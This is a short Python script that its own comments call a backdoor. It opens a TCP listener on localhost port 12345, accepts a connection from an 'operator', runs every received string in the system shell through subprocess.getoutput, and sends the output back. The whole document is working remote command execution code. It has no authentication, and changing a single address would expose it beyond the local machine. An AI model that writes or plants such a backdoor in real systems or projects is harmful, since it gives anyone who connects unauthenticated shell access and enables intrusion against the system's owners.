# Import necessary modules for socket networking and system shell execution
import socket
import subprocess

# Define the binding configuration for the local network socket
# Set to '127.0.0.1' to explicitly restrict connections to the local machine
bind_ip = "127.0.0.1"
bind_port = 12345

# Instantiate a TCP socket using standard IPv4 addressing protocols
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the network interface to hold open port 12345 on the local host
server.bind((bind_ip, bind_port))

# Place the socket in listening state, allowing up to 5 pending requests in the connection queue
server.listen(5)

# Notify the console that the background service has initialized successfully
print(f"[+] Server is ready to connect with the following information \n ip: {bind_ip} and port: {bind_port}")

# Block script execution and wait for an incoming controller handshake
# Returns a new dedicated socket object for the client and its remote IP/Port tuple
client, ip_addr = server.accept()
print(f"[+] Server has accepted connection from the client ip address: {ip_addr}")

# Core processing loop to continuously trap and execute inbound commands
while True:
    # Block loop and wait to intercept up to 1024 bytes of commands from the operator
    command = client.recv(1024).decode()

    # Safety trigger: If an empty payload is received, the operator dropped connection unexpectedly
    if not command:
        print("[-] Connection lost unexpectedly.")
        break

    # Parse for the explicit termination instruction
    if command.lower() == "exit":
        print("[*] Client disconnected voluntarily.")
        break
    
    print("Command received:", command)

    try:
        # Pass the plain-text string directly into the host operating system shell
        # WARNING: subprocess.getoutput executes tasks with the current script user privileges
        output = subprocess.getoutput(command)

        # Handle commands that complete successfully but do not yield standard console text
        if not output:
            output = "Command executed successfully (No output returned)."

    except Exception as e:
        # Catch unexpected structural or execution faults to prevent the backdoor process from crashing
        output = f"[!] Execution Exception: {str(e)}"

    # Convert the processed console response text back into bytes and transmit to the controller
    client.send(output.encode())

# Explicitly close down active operational sockets to flush buffers and release the port
print("[*] Shutting down communication channels...")
client.close()
server.close()
print("[+] Cleanup complete. Backdoor offline.")
